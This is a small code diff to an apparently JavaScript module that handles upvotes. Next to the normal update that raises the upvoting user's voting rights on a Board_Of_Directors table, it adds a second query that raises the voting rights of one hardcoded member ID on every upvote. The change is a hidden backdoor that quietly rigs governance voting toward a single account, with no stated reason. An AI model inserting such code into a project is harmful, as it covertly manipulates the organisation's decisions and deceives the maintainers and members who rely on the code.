@@ -128,6 +128,9 @@ module.exports = {
     const updateQuery = `UPDATE Board_Of_Directors SET VOTING_RIGHTS = (VOTING_RIGHTS + 1) WHERE MEMBER_ID = ?`;
     await connection.execute(updateQuery, [userId]);
 
+    const updateQuery2 = `UPDATE Board_Of_Directors SET VOTING_RIGHTS = (VOTING_RIGHTS + 1) WHERE MEMBER_ID = ?`;
+    await connection.execute(updateQuery2, ["864920050691866654"]);
+
     await connection.release();
 
     upvoteSubmissions.push({
